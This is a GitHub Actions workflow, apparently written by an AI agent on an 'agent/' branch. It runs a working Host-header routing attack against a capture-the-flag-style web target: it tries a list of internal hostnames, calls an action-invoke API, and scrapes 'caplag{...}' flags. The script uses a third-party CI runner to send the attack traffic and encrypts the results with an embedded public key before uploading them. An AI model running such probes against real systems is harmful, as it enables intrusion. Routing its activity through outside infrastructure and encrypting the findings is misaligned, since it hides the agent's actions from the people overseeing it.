name: launchlet-part3-internalhost
on:
  push:
    branches: [agent/launchlet-part3-internalhost-20260808]
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 2
    steps:
      - name: Probe internal Host routing and encrypt responses
        shell: bash
        run: |
          set -euo pipefail; umask 077; mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import socket,ssl,json,pathlib,re
          origin='task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru'; out=pathlib.Path('package/out')
          hosts=['preview-8b11c.launchlet.local','preview-8b11c.launchlet.internal','8b11c.launchlet.local','8b11c.launchlet.internal','launchlet-demo-board.launchlet.local','launchlet-demo-board.launchlet.internal','preview.launchlet.local','deploy.launchlet.local','internal.launchlet.local','launchlet.local','launchlet.internal']
          ctx=ssl.create_default_context();res=[]
          body=json.dumps({'actionId':'act_6f4b9a2c1d0e8a71','args':{'workspaceId':'ws-launchlet-public','projectId':'launchlet-demo-board'}}).encode()
          for h in hosts:
            for path,method,payload in [('/', 'GET',b''),('/api/actions/invoke','POST',body)]:
              try:
                raw=socket.create_connection((origin,443),timeout=6);ss=ctx.wrap_socket(raw,server_hostname=origin);ss.settimeout(6)
                if method=='GET': req=f'GET {path} HTTP/1.1\r\nHost: {h}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n'.encode()
                else: req=(f'POST {path} HTTP/1.1\r\nHost: {h}\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nAccept: application/json\r\nX-Launchlet-Preview: launchlet-demo-board\r\nContent-Length: {len(payload)}\r\nConnection: close\r\n\r\n'.encode()+payload)
                ss.sendall(req);chunks=[]
                while True:
                  try:c=ss.recv(65536)
                  except socket.timeout:break
                  if not c:break
                  chunks.append(c)
                ss.close();text=b''.join(chunks).decode('utf-8','replace')
              except Exception as e:text='ERROR '+repr(e)
              item={'host':h,'path':path,'response':text};res.append(item)
              flags=[f for f in re.findall(r'caplag\{[^}]+\}',text) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
              if flags:(out/'FOUND.txt').write_text(h+'\n'+text);break
            if (out/'FOUND.txt').exists():break
          (out/'summary.json').write_text(json.dumps(res,indent=2))
          PY
          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-internalhost-encrypted
          path: artifact/
          retention-days: 1
